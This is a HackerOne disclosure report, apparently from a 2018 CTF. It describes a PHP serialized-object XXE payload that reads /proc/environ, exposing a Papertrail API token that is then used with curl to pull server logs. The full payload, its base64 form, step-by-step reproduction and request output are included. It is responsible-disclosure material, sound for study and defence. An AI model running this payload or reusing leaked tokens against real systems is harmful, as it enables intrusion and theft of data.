{"id":416123,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTYxMjM=","url":"https://hackerone.com/reports/416123","title":"MemeCTF serial exploitation to local file read to Papertrail access via API-token leakage and more","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-09-29T13:19:28.591Z","submitted_at":"2018-09-29T13:19:28.591Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"osintopsec","url":"/osintopsec","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":33314,"url":"https://hackerone.com/h1-5411-ctf","handle":"h1-5411-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/033/314/9e31bd74c6486465dd01f5ef0a98eb4ebe1b6459_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/314/9e31bd74c6486465dd01f5ef0a98eb4ebe1b6459_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"h1-5411-CTF","twitter_handle":null,"website":"http://tbd.com","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-10-22T20:38:44.720Z","bug_reporter_agreed_on_going_public_at":"2018-10-22T17:55:15.261Z","team_member_agreed_on_going_public_at":"2018-10-22T20:38:44.619Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi there dear CTF staff!\n\nFirst of all a huge thank you for the great challenge you put up! I've found it super exciting and the learning curve has been steep.\n\nFor this case, I was first wondering if this is a part of the actual CTF, but after some inspecting, it surely doesn't seem so! I did even reach out to you via Twitter for initial confirmation.\n\n{F352815}\n\n\nThe Case\n=====================\n\nDuring some serious Meme generation and attempting on the CTF, I managed to reach a situation where I was able to read files from the local filesystem via XXE. After some poking around on the filesystem I was able to determin the Apache2 process id by chaining file discoveries:\n-\u003e /etc/apache2/apache2.conf\n-\u003e /etc/apache2/envvars\n-\u003e /var/run/apache2$SUFFIX/apache2.pid, (Notes: $SUFFIX = \"\" and the file contains \"10\")\n-\u003e /proc/10/environ\n\nWhich contains the environment data for Apache2 as (redacted for your good!):\n\n```\nHEROKU_EXEC_URL=https://exec-manager.heroku.com/ea0bc596-REDACTED\nPHP_EXTRA_CONFIGURE_ARGS=--with-apxs2 --disable-cgi\nAPACHE_CONFDIR=/etc/apache2\nPHP_INI_DIR=/usr/local/etc/php\nSHLVL=1\nPHP_EXTRA_BUILD_DEPS=apache2-dev\nPORT=58345\nPHP_LDFLAGS=-Wl,-O1 -Wl,--hash-style=both -pie\nAPACHE_RUN_DIR=/var/run/apache2\nPHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2\nPHP_MD5=\nPHP_VERSION=7.2.10\nAPACHE_PID_FILE=/var/run/apache2/apache2.pid\nGPG_KEYS=1729F83938-REDACTED B1B44D8F021E-REDACTED\nPHP_ASC_URL=https://secure.php.net/get/php-7.2.10.tar.xz.asc/from/this/mirror\nPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2\n_=/usr/sbin/apache2ctl\nPHP_URL=https://secure.php.net/get/php-7.2.10.tar.xz/from/this/mirror\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nPAPERTRAIL_API_TOKEN=ii6r9Ze-REDACTED\nAPACHE_LOCK_DIR=/var/lock/apache2\nLANG=C\nAPACHE_RUN_USER=www-data\nAPACHE_RUN_GROUP=www-data\nAPACHE_LOG_DIR=/var/log/apache2\nPHPIZE_DEPS=autoconf \t\tdpkg-dev \t\tfile \t\tg++ \t\tgcc \t\tlibc-dev \t\tmake \t\tpkg-config \t\tre2c\nPWD=/app\nPHP_SHA256=01c2154a3a8e3c0818acbdbc1a956832c828a0380ce6d1d14fea495ea21804f0\nAPACHE_ENVVARS=/etc/apache2/envvars\nDYNO=web.1\n```\n\nWhat caught my eye were Papertrail API-token and GPG-keypair. Also Heroku Exec url is present.\n\n{F352822}\n\nSo, as the ideas of this actually being a part of the CTF fading away and having nice previous record of finding and utilizing API-keys, I decided to test the Papertrail token for myself. And how about it? Works!\n\nAfter some poking around I landed on this:\n\n```\ncurl -i -H \"X-Papertrail-Token: ii6r9Ze-REDACTED\" https://papertrailapp.com/api/v1/events/search.json?system_id=23562-REDACTED\nHTTP/1.1 200 OK\nDate: Sat, 29 Sep 2018 11:29:58 GMT\nStrict-Transport-Security: max-age=31536000\nX-Frame-Options: SAMEORIGIN\nX-Rate-Limit-Limit: 25\nX-Rate-Limit-Remaining: 24\nX-Rate-Limit-Reset: 2\nX-Shibboleet: if you see this, we'd like to get you a thank you espresso\nX-Runtime: 440\nETag: \"6fa205988ad388afc-REDACTED\"\nCache-Control: private, max-age=0, must-revalidate\nContent-Length: 636600\nStatus: 200 OK\nContent-Type: application/json; charset=utf-8\n\n{\n\t\"min_id\": \"98264920-REDACTED\",\n\t\"max_id\": \"9826557-REDACTED\",\n\t\"events\": [{\n\t\t\t\"id\": \"9826492-REDACTED\",\n\t\t\t\"source_ip\": \"54.205.-REDACTED\",\n\t\t\t\"program\": \"heroku/router\",\n\t\t\t\"message\": \"at=info method=GET path=\\\"/vendor/font-awesome/css/font-awesome.min.css\\\" host=h1-5411.h1ctf.com request_id=5fb495c5-7237-455b-b79d--REDACTED fwd=\\\"192.130.-REDACTED\\\" dyno=web.1 connect=0ms service=3ms status=200 bytes=7354 protocol=https \",\n\t\t\t\"received_at\": \"2018-09-29T04:04:09-07:00\",\n\t\t\t\"generated_at\": \"2018-09-29T04:04:09-07:00\",\n\t\t\t\"display_received_at\": \"Sep 29 04:04:09\",\n\t\t\t\"source_id\": 23562-REDACTED,\n\t\t\t\"source_name\": \"h1-5411-2018-ctf\",\n\t\t\t\"hostname\": \"h1-5411-2018-ctf\",\n\t\t\t\"severity\": \"Info\",\n\t\t\t\"facility\": \"Local3\"\n\t\t}, {\n\t\t\t\"id\": \"982649204-REDACTED\",\n\t\t\t\"source_ip\": \"50.19.-REDACTED\",\n\t\t\t\"program\": \"heroku/router\",\n\t\t\t\"message\": \"at=info method=GET path=\\\"/vendor/jquery-easing/jquery.easing.min.js\\\" host=h1-5411.h1ctf.com request_id=8d7e3947-cba9-4661-a34c-1b385021600c fwd=\\\"192.130.-REDACTED\\\" dyno=web.1 connect=1ms service=2ms status=200 bytes=1130 protocol=https \",\n\t\t\t\"received_at\": \"2018-09-29T04:04:09-07:00\",\n\t\t\t\"generated_at\": \"2018-09-29T04:04:09-07:00\",\n\t\t\t\"display_received_at\": \"Sep 29 04:04:09\",\n\t\t\t\"source_id\": 23562-REDACTED,\n\t\t\t\"source_name\": \"h1-5411-2018-ctf\",\n\t\t\t\"hostname\": \"h1-5411-2018-ctf\",\n\t\t\t\"severity\": \"Info\",\n\t\t\t\"facility\": \"Local3\"\n\t\t},\n........ And so on.\n```\n\nAnd this particular header caught my eye:\n\n```\nX-Shibboleet: if you see this, we'd like to get you a thank you espresso\n```\n\nSo here I am, writing a report about this.\n\nSteps to reproduce\n=====================\nA good report almost always requires steps to reproduce. My apologies if this is something stupid and the read could be done more elegantly! I'll also skip the first parts of the challenge, since they're not neede to reproduce.\n\n1. Prepare the following serialized PHP-object  with a XXE payloadfor injection\n```\na:2:{i:0;s:93:\"../data/memes/1538175596-8bc89487fb699b9a757aaeec7cc4f19bdcfcb436cdbeac3389f8a91908721f17.txt\";i:1;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:276:\"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY \u003e\u003c!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=file:///proc/10/environ'\u003e]\u003e\u003cmeme\u003e\u003ctoptext\u003eqwerty\u003c/toptext\u003e\u003cbottomtext\u003easdasd\u003c/bottomtext\u003e\u003ctemplate\u003e\u0026xxe;\u003c/template\u003e\u003ctype\u003eTEXT\u003c/type\u003e\u003c/meme\u003e\";}}\n```\n\nwhich is the following base64-string\n\n```\nYToyOntpOjA7czo5MzoiLi4vZGF0YS9tZW1lcy8xNTM4MTc1NTk2LThiYzg5NDg3ZmI2OTliOWE3NTdhYWVlYzdjYzRmMTliZGNmY2I0MzZjZGJlYWMzMzg5ZjhhOTE5MDg3MjFmMTcudHh0IjtpOjE7TzoxMDoiQ29uZmlnRmlsZSI6MTp7czoxMDoiY29uZmlnX3JhdyI7czoyNzY6Ijw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+PCFET0NUWVBFIGZvbyBbPCFFTEVNRU5UIGZvbyBBTlkgPjwhRU5USVRZIHh4ZSBTWVNURU0gJ3BocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9ZmlsZTovLy9wcm9jLzEwL2Vudmlyb24nPl0+PG1lbWU+PHRvcHRleHQ+cXdlcnR5PC90b3B0ZXh0Pjxib3R0b210ZXh0PmFzZGFzZDwvYm90dG9tdGV4dD48dGVtcGxhdGU+Jnh4ZTs8L3RlbXBsYXRlPjx0eXBlPlRFWFQ8L3R5cGU+PC9tZW1lPiI7fX0=\n```\nand save it as \"memes.memepack\" -file\n\n2. Navigate to https://h1-5411.h1ctf.com/import_memes_2.0.php\n3. Click \"Choose file\" and open the newly created \"memes.memepack\"-file\n4. Open browser developer console or log requests with a proxy\n5. Click \"Import\"\n6. Inspect developer console or proxy, which should look similar to\n{F352830}\n7. Base64-decode parameter \"Template Location\" after \"=\u003e\", which contains the file /proc/10/environ -file\n8. Profit! \n9. Get the Papertrail API-token\n10. Prepare Curl for example as following\n ```\ncurl -i -H \"X-Papertrail-Token: [INSERT PAPERTRAIL API-TOKEN HERE]\"  https://papertrailapp.com/api/v1/events/search.json?q=error\n```\n\n11. Inspect that response headers look similar to this:\n```\ncurl -i -H \"X-Papertrail-Token: ii6r9Ze-REDACTED\" https://papertrailapp.com/api/v1/events/search.json?q=error\nHTTP/1.1 200 OK\nDate: Sat, 29 Sep 2018 13:08:00 GMT\nStrict-Transport-Security: max-age=31536000\nX-Frame-Options: SAMEORIGIN\nX-Rate-Limit-Limit: 25\nX-Rate-Limit-Remaining: 24\nX-Rate-Limit-Reset: 5\nX-Shibboleet: if you see this, we'd like to get you a thank you espresso\nX-Runtime: 528\nETag: \"7207607ce216ca0fc-REDACTEDc\"\nCache-Control: private, max-age=0, must-revalidate\nContent-Length: 498309\nStatus: 200 OK\nContent-Type: application/json; charset=utf-8\n```\n12. Double profit!\n\n## Impact\n\nThe main impact of this vulnerability seems to be this!\n```\nX-Shibboleet: if you see this, we'd like to get you a thank you espresso\n```\n\nHowever, a malicious individual would propably harvest hacker IP-addresses and see what the other CTF contestants are doing on the box using the Papertrail token. Also GPG-keys should be kept private, as Heroku Exec manager-links.\n\n{F352838}","vulnerability_information_html":"\u003cp\u003eHi there dear CTF staff!\u003c/p\u003e\n\n\u003cp\u003eFirst of all a huge thank you for the great challenge you put up! I\u0026#39;ve found it super exciting and the learning curve has been steep.\u003c/p\u003e\n\n\u003cp\u003eFor this case, I was first wondering if this is a part of the actual CTF, but after some inspecting, it surely doesn\u0026#39;t seem so! I did even reach out to you via Twitter for initial confirmation.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"twitter.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/815/384eb4d5d8b6fa744f8063b35f2cb3e5f3990263/twitter.png?response-content-disposition=attachment%3B%20filename%3D%22twitter.png%22%3B%20filename%2A%3DUTF-8%27%27twitter.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055441Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=d9b40fa14f058a006ac3dd3306c7f21cc0b923006063c1ec30bc399281eca0c0\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/815/384eb4d5d8b6fa744f8063b35f2cb3e5f3990263/twitter.png?response-content-disposition=attachment%3B%20filename%3D%22twitter.png%22%3B%20filename%2A%3DUTF-8%27%27twitter.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055441Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=d9b40fa14f058a006ac3dd3306c7f21cc0b923006063c1ec30bc399281eca0c0\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"the-case\"\u003eThe Case\u003c/h1\u003e\n\n\u003cp\u003eDuring some serious Meme generation and attempting on the CTF, I managed to reach a situation where I was able to read files from the local filesystem via XXE. After some poking around on the filesystem I was able to determin the Apache2 process id by chaining file discoveries:\u003cbr\u003e\n-\u0026gt; /etc/apache2/apache2.conf\u003cbr\u003e\n-\u0026gt; /etc/apache2/envvars\u003cbr\u003e\n-\u0026gt; /var/run/apache2$SUFFIX/apache2.pid, (Notes: $SUFFIX = \u0026quot;\u0026quot; and the file contains \u0026quot;10\u0026quot;)\u003cbr\u003e\n-\u0026gt; /proc/10/environ\u003c/p\u003e\n\n\u003cp\u003eWhich contains the environment data for Apache2 as (redacted for your good!):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHEROKU_EXEC_URL=https://exec-manager.heroku.com/ea0bc596-REDACTED\nPHP_EXTRA_CONFIGURE_ARGS=--with-apxs2 --disable-cgi\nAPACHE_CONFDIR=/etc/apache2\nPHP_INI_DIR=/usr/local/etc/php\nSHLVL=1\nPHP_EXTRA_BUILD_DEPS=apache2-dev\nPORT=58345\nPHP_LDFLAGS=-Wl,-O1 -Wl,--hash-style=both -pie\nAPACHE_RUN_DIR=/var/run/apache2\nPHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2\nPHP_MD5=\nPHP_VERSION=7.2.10\nAPACHE_PID_FILE=/var/run/apache2/apache2.pid\nGPG_KEYS=1729F83938-REDACTED B1B44D8F021E-REDACTED\nPHP_ASC_URL=https://secure.php.net/get/php-7.2.10.tar.xz.asc/from/this/mirror\nPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2\n_=/usr/sbin/apache2ctl\nPHP_URL=https://secure.php.net/get/php-7.2.10.tar.xz/from/this/mirror\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nPAPERTRAIL_API_TOKEN=ii6r9Ze-REDACTED\nAPACHE_LOCK_DIR=/var/lock/apache2\nLANG=C\nAPACHE_RUN_USER=www-data\nAPACHE_RUN_GROUP=www-data\nAPACHE_LOG_DIR=/var/log/apache2\nPHPIZE_DEPS=autoconf        dpkg-dev        file        g++         gcc         libc-dev        make        pkg-config      re2c\nPWD=/app\nPHP_SHA256=01c2154a3a8e3c0818acbdbc1a956832c828a0380ce6d1d14fea495ea21804f0\nAPACHE_ENVVARS=/etc/apache2/envvars\nDYNO=web.1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhat caught my eye were Papertrail API-token and GPG-keypair. Also Heroku Exec url is present.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"1538224862-ed7a521beddb5ae8959112892d9e8fbed353c27b24dcc98bb05b44579841cf8a.jpg\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/822/cd7ea1c07410de16832a84ec7c15c01729cabffa/1538224862-ed7a521beddb5ae8959112892d9e8fbed353c27b24dcc98bb05b44579841cf8a.jpg?response-content-disposition=attachment%3B%20filename%3D%221538224862-ed7a521beddb5ae8959112892d9e8fbed353c27b24dcc98bb05b44579841cf8a.jpg%22%3B%20filename%2A%3DUTF-8%27%271538224862-ed7a521beddb5ae8959112892d9e8fbed353c27b24dcc98bb05b44579841cf8a.jpg\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055441Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=6b1ab66108291e02faa58bfe1f3c5b8a0f3c2e439ccce59d49b3b4c182099af3\" data-attachment-type=\"image/jpeg\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/352/822/cd7ea1c07410de16832a84ec7c15c01729cabffa/1538224862-ed7a521beddb5ae8959112892d9e8fbed353c27b24dcc98bb05b44579841cf8a.jpg?response-content-disposition=attachment%3B%20filename%3D%221538224862-ed7a521beddb5ae8959112892d9e8fbed353c27b24dcc98bb05b44579841cf8a.jpg%22%3B%20filename%2A%3DUTF-8%27%271538224862-ed7a521beddb5ae8959112892d9e8fbed353c27b24dcc98bb05b44579841cf8a.jpg\u0026amp;response-content-type=image%2Fjpeg\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055441Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=6b1ab66108291e02faa58bfe1f3c5b8a0f3c2e439ccce59d49b3b4c182099af3\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eSo, as the ideas of this actually being a part of the CTF fading away and having nice previous record of finding and utilizing API-keys, I decided to test the Papertrail token for myself. And how about it? Works!\u003c/p\u003e\n\n\u003cp\u003eAfter some poking around I landed on this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -i -H \u0026quot;X-Papertrail-Token: ii6r9Ze-REDACTED\u0026quot; https://papertrailapp.com/api/v1/events/search.json?system_id=23562-REDACTED\nHTTP/1.1 200 OK\nDate: Sat, 29 Sep 2018 11:29:58 GMT\nStrict-Transport-Security: max-age=31536000\nX-Frame-Options: SAMEORIGIN\nX-Rate-Limit-Limit: 25\nX-Rate-Limit-Remaining: 24\nX-Rate-Limit-Reset: 2\nX-Shibboleet: if you see this, we\u0026#39;d like to get you a thank you espresso\nX-Runtime: 440\nETag: \u0026quot;6fa205988ad388afc-REDACTED\u0026quot;\nCache-Control: private, max-age=0, must-revalidate\nContent-Length: 636600\nStatus: 200 OK\nContent-Type: application/json; charset=utf-8\n\n{\n    \u0026quot;min_id\u0026quot;: \u0026quot;98264920-REDACTED\u0026quot;,\n    \u0026quot;max_id\u0026quot;: \u0026quot;9826557-REDACTED\u0026quot;,\n    \u0026quot;events\u0026quot;: [{\n            \u0026quot;id\u0026quot;: \u0026quot;9826492-REDACTED\u0026quot;,\n            \u0026quot;source_ip\u0026quot;: \u0026quot;54.205.-REDACTED\u0026quot;,\n            \u0026quot;program\u0026quot;: \u0026quot;heroku/router\u0026quot;,\n            \u0026quot;message\u0026quot;: \u0026quot;at=info method=GET path=\\\u0026quot;/vendor/font-awesome/css/font-awesome.min.css\\\u0026quot; host=h1-5411.h1ctf.com request_id=5fb495c5-7237-455b-b79d--REDACTED fwd=\\\u0026quot;192.130.-REDACTED\\\u0026quot; dyno=web.1 connect=0ms service=3ms status=200 bytes=7354 protocol=https \u0026quot;,\n            \u0026quot;received_at\u0026quot;: \u0026quot;2018-09-29T04:04:09-07:00\u0026quot;,\n            \u0026quot;generated_at\u0026quot;: 